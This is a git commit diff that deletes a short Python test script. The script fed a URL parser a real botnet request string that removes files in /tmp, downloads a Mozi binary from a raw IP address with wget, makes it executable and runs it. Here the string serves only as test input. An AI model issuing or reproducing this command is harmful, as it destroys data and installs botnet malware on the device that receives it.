f961d40d913f92a6fb209000c783ae6bdbc13935
Daniel A <den.xyz@pm.me>
2020-11-01 14:05:59 +0000

    Removed ripe atlas utility file and  dependency from requirements.txt

--- src/processing/testerino.py
+++
@@ -1,8 +0,0 @@
-from utils.misc import url_parser, validate_url
-
-urls = url_parser("GET /shell?cd /tmp;rm -rf *;wget http://82.24.38.130/;chmod 777 Mozi.a;/tmp/Mozi.a jaws HTTP/1.1")
-
-
-
-for url in urls:
-    print(validate_url(url))
